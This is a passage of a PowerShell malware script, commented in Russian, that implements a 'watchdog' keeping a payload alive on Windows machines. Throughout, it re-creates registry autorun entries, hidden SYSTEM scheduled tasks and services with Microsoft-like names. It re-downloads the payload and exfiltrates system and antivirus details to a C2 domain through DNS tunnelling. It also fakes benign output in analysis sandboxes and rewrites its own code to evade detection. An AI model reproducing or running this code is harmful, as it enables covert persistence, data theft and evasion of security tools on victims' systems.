                    if (Get-ItemProperty -Path $regPath -Name $serviceName -ErrorAction SilentlyContinue) {
                        $found = $true
                        break
                    }
                }
                
                # Если не найдено ни одной нашей записи, восстанавливаем
                if (-not $found) {
                    Restore-RegistryEntries -RegistryPath $regPath
                }
            }
        }
    }
    catch {}
}

# Функция восстановления удаленных записей реестра
function Restore-RegistryEntries {
    param (
        [string]$RegistryPath
    )
    
    try {
        # Выбираем случайное имя службы и случайное расположение для дропа
        $serviceName = $config.ServiceNames | Get-Random
        $dropLocation = $config.DropLocations | Get-Random
        $fileName = Get-RandomName -Length 8 -IncludeNumbers
        $filePath = Join-Path -Path $dropLocation -ChildPath "$fileName.exe"
        
        # Создаем копию защищаемого файла
        if (Test-Path $config.ProtectedFile) {
            Copy-Item -Path $config.ProtectedFile -Destination $filePath -Force -ErrorAction Stop
        }
        else {
            # Если защищаемый файл отсутствует, скачиваем заново
            Disguise-NetworkTraffic -Url $config.WatchdogURL -OutputPath $filePath
        }
        
        # Добавляем запись в реестр
        if (Test-Path $RegistryPath) {
            Set-ItemProperty -Path $RegistryPath -Name $serviceName -Value $filePath -ErrorAction Stop
        }
    }
    catch {}
}

# Функция мониторинга планировщика задач
function Monitor-ScheduledTasks {
    try {
        # Проверяем задачи, которые должны быть созданы
        $watchdogTasks = Get-ScheduledTask | Where-Object { 
            $_.TaskPath -like "*\Microsoft\Windows\*" -and 
            $_.TaskName -match "(Update|Monitor|Health|Security)" 
        } -ErrorAction SilentlyContinue
        
        # Если найдено менее 2 наших задач, создаем новые
        if ($watchdogTasks.Count -lt 2) {
            for ($i = 0; $i -lt (3 - $watchdogTasks.Count); $i++) {
                # Создаем новую задачу
                $taskName = "Microsoft\Windows\" + (Get-RandomName -Length 5) + "\Monitor"
                $clonePath = Join-Path -Path ($config.DropLocations | Get-Random) -ChildPath "$(Get-RandomName).exe"
                
                # Копируем защищаемый файл
                if (Test-Path $config.ProtectedFile) {
                    Copy-Item -Path $config.ProtectedFile -Destination $clonePath -Force -ErrorAction SilentlyContinue
                }
                else {
                    # Если защищаемый файл отсутствует, скачиваем заново
                    Disguise-NetworkTraffic -Url $config.WatchdogURL -OutputPath $clonePath
                }
                
                # Создаем задачу
                $action = New-ScheduledTaskAction -Execute $clonePath
                $trigger = New-ScheduledTaskTrigger -AtStartup
                $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
                $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
                
                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -ErrorAction SilentlyContinue
            }
        }
    }
    catch {}
}

# Функция мониторинга служб Windows
function Monitor-WindowsServices {
    try {
        # Проверяем службы, которые должны быть созданы
        $watchdogServices = Get-Service | Where-Object { 
            $config.ServiceNames -contains $_.Name
        } -ErrorAction SilentlyContinue
        
        # Если найдено менее 2 наших служб, создаем новые
        if ($watchdogServices.Count -lt 2) {
            for ($i = 0; $i -lt (3 - $watchdogServices.Count); $i++) {
                # Выбираем случайное имя службы
                $serviceName = $config.ServiceNames | Where-Object { 
                    $watchdogServices.Name -notcontains $_ 
                } | Get-Random
                
                if (-not $serviceName) {
                    $serviceName = "Win" + (Get-RandomName -Length 5)
                }
                
                $displayName = "Windows $($serviceName.Replace('Win', '').Replace('Svc', '')) Service"
                $clonePath = Join-Path -Path ($config.DropLocations | Get-Random) -ChildPath "$(Get-RandomName).exe"
                
                # Копируем защищаемый файл
                if (Test-Path $config.ProtectedFile) {
                    Copy-Item -Path $config.ProtectedFile -Destination $clonePath -Force -ErrorAction SilentlyContinue
                }
                else {
                    # Если защищаемый файл отсутствует, скачиваем заново
                    Disguise-NetworkTraffic -Url $config.WatchdogURL -OutputPath $clonePath
                }
                
                # Создаем службу
                New-Service -Name $serviceName -BinaryPathName $clonePath -DisplayName $displayName -StartupType Automatic -ErrorAction SilentlyContinue
                Start-Service -Name $serviceName -ErrorAction SilentlyContinue
            }
        }
    }
    catch {}
}

# 4. КОММУНИКАЦИЯ И УПРАВЛЕНИЕ

# Функция DNS-туннелирования для коммуникации с C2
function Invoke-DNSTunneling {
    param (
        [string]$Data,
        [string]$Domain = $config.C2Domain
    )
    
    try {
        # Кодируем данные в Base64
        $encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
        
        # Разбиваем данные на фрагменты по 40 символов (безопасный размер для DNS)
        $fragments = @()
        for ($i = 0; $i -lt $encodedData.Length; $i += 40) {
            if ($i + 40 -lt $encodedData.Length) {
                $fragments += $encodedData.Substring($i, 40)
            }
            else {
                $fragments += $encodedData.Substring($i)
            }
        }
        
        # Генерируем случайный ID сессии
        $sessionId = Get-RandomName -Length 6 -IncludeNumbers
        
        # Отправляем каждый фрагмент через DNS-запрос
        for ($i = 0; $i -lt $fragments.Count; $i++) {
            $query = "$sessionId-$i-$($fragments[$i]).$Domain"
            
            # Используем родной DNS-запрос для туннелирования данных
            Resolve-DnsName -Name $query -Type A -Server $config.DnsServer -ErrorAction SilentlyContinue | Out-Null
            
            # Добавляем небольшую задержку между запросами
            Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 200)
        }
        
        # Отправляем завершающий фрагмент
        $finalQuery = "$sessionId-end.$Domain"
        Resolve-DnsName -Name $finalQuery -Type A -Server $config.DnsServer -ErrorAction SilentlyContinue | Out-Null
        
        return $true
    }
    catch {
        return $false
    }
}

# Функция сбора информации о системе
function Get-SystemInfo {
    try {
        $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
        $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
        $processorInfo = Get-CimInstance -ClassName Win32_Processor -ErrorAction SilentlyContinue
        
        $systemInfo = @{
            "ComputerName" = $env:COMPUTERNAME
            "UserName" = $env:USERNAME
            "OSVersion" = $osInfo.Caption
            "OSBuildNumber" = $osInfo.BuildNumber
            "SystemType" = $computerSystem.SystemType
            "Manufacturer" = $computerSystem.Manufacturer
            "Model" = $computerSystem.Model
            "Processor" = $processorInfo.Name
            "ProcessorCores" = $processorInfo.NumberOfCores
            "TotalMemoryGB" = [math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)
            "Domain" = $computerSystem.Domain
            "IPAddresses" = @(Get-NetIPAddress -ErrorAction SilentlyContinue | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1" } | Select-Object -ExpandProperty IPAddress)
            "InstalledAntivirus" = (Get-ActiveAntiviruses)
            "WatchdogStartTime" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            "ActiveClones" = $config.ActiveClones
        }
        
        return $systemInfo
    }
    catch {
        return @{
            "ComputerName" = $env:COMPUTERNAME
            "UserName" = $env:USERNAME
            "Error" = "Failed to collect full system info"
        }
    }
}

# 5. ОСНОВНОЙ ЦИКЛ WATCHDOG

# Функция инициализации watchdog
function Initialize-Watchdog {
    # Определяем защищаемый файл, если он еще не определен
    if (-not $config.ProtectedFile) {
        $config.ProtectedFile = Get-ProtectedFile
    }
    
    # Проверяем среду выполнения
    $isAnalysisEnvironment = Detect-AnalysisEnvironment
    
    # Особое поведение в среде анализа
    if ($isAnalysisEnvironment -and -not $config.DebugMode) {
        # В среде анализа действуем как безобидная программа
        if ((Get-Random -Minimum 1 -Maximum 10) -gt 7) {
            # С небольшой вероятностью завершаем выполнение
            exit
        }
        
        # Имитируем легитимную активность
        $analysis = @{
            "SystemCheck" = "Checking system integrity"
            "Result" = "No problems found"
            "Status" = "Normal"
        }
        
        # Выводим в лог безобидные сообщения для обмана аналитиков
        Write-Output "System check completed successfully. No issues found."
        Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
        exit
    }
    
    # Создаем начальные клоны только при первом запуске
    if ($config.ActiveClones -eq 0) {
        # Создаем несколько копий watchdog в разных местах системы
        Invoke-WatchdogCloning -CloneCount (Get-Random -Minimum 3 -Maximum 7)
    }
    
    # Пытаемся обойти антивирусы
    Bypass-Antiviruses -FilePath $config.ProtectedFile
    
    # Сохраняем начальный хеш защищаемого файла
    if (Test-Path $config.ProtectedFile) {
        Verify-FileIntegrity -FilePath $config.ProtectedFile
    }
    
    # Отправляем начальную информацию через DNS-туннелирование
    $systemInfo = Get-SystemInfo
    $infoJson = ConvertTo-Json -InputObject $systemInfo -Compress
    Invoke-DNSTunneling -Data $infoJson
    
    # Настраиваем и запускаем основной цикл мониторинга
    Start-WatchdogLoop
}

# Основной цикл мониторинга
function Start-WatchdogLoop {
    # Бесконечный цикл мониторинга
    while ($true) {
        try {
            # 1. Проверяем наличие и целостность защищаемого файла
            $fileExists = Test-Path $config.ProtectedFile
            $fileIntegrity = $fileExists -and (Verify-FileIntegrity -FilePath $config.ProtectedFile)
            
            if (-not $fileExists -or -not $fileIntegrity) {
                # Файл отсутствует или изменен - восстанавливаем
                $restored = Restore-ProtectedFile -FilePath $config.ProtectedFile
                
                # Отправляем уведомление о восстановлении
                if ($restored) {
                    $notificationData = @{
                        "Event" = "FileRestored"
                        "Path" = $config.ProtectedFile
                        "Time" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        "Status" = "Success"
                    }
                }
                else {
                    $notificationData = @{
                        "Event" = "FileRestoreFailed"
                        "Path" = $config.ProtectedFile
                        "Time" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        "Status" = "Failure"
                    }
                }
                
                $notificationJson = ConvertTo-Json -InputObject $notificationData -Compress
                Invoke-DNSTunneling -Data $notificationJson
            }
            
            # 2. Проверяем состояние автозагрузки в реестре
            Monitor-RegistryIntegrity
            
            # 3. Проверяем состояние задач в планировщике
            Monitor-ScheduledTasks
            
            # 4. Проверяем состояние служб Windows
            Monitor-WindowsServices
            
            # 5. Периодически проверяем количество активных клонов
            if ((Get-Random -Minimum 1 -Maximum 100) -le 5) {  # 5% шанс
                # Если активных клонов меньше минимума, создаем новые
                if ($config.ActiveClones -lt 5) {
                    Invoke-WatchdogCloning -CloneCount (Get-Random -Minimum 1 -Maximum 3)
                }
            }
            
            # 6. Периодически отправляем информацию о состоянии системы
            if ((Get-Random -Minimum 1 -Maximum 100) -le 2) {  # 2% шанс
                $statusInfo = @{
                    "Event" = "StatusUpdate"
                    "Time" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    "FileStatus" = if ($fileExists) { "Exists" } else { "Missing" }
                    "FileIntegrity" = if ($fileIntegrity) { "Intact" } else { "Modified" }
                    "ActiveClones" = $config.ActiveClones
                    "Antivirus" = (Get-ActiveAntiviruses)
                }
                
                $statusJson = ConvertTo-Json -InputObject $statusInfo -Compress
                Invoke-DNSTunneling -Data $statusJson
            }
            
            # 7. Периодическая самомодификация для избежания обнаружения
            if ((Get-Random -Minimum 1 -Maximum 1000) -le 10) {  # 1% шанс
                # Модифицируем текущий скрипт
                $scriptContent = Get-Content -Path $PSCommandPath -Raw
                $mutatedContent = Invoke-CodeMutation -CodeContent $scriptContent
                
                # Сохраняем модифицированную версию в новый файл
                $newScriptPath = Join-Path -Path $env:TEMP -ChildPath "$(Get-RandomName).ps1"
                $mutatedContent | Out-File -FilePath $newScriptPath -Force
                
                # Запускаем модифицированную версию
                Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$newScriptPath`"" -WindowStyle Hidden
                
                # Завершаем текущий экземпляр
                exit
            }
        }
        catch {
            # Игнорируем ошибки и продолжаем работу
        }
        
        # Случайная пауза между итерациями для непредсказуемости
        Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 8)
    }
}

# Запускаем watchdog с обработкой ошибок
try {
    # Получаем защищаемый файл
    $config.ProtectedFile = Get-ProtectedFile
    
    # Запускаем watchdog
    Initialize-Watchdog
}
catch {
    # В случае критической ошибки пытаемся перезапуститься через некоторое время
    Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 180)
    
    # Перезапускаем скрипт
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -WindowStyle Hidden
}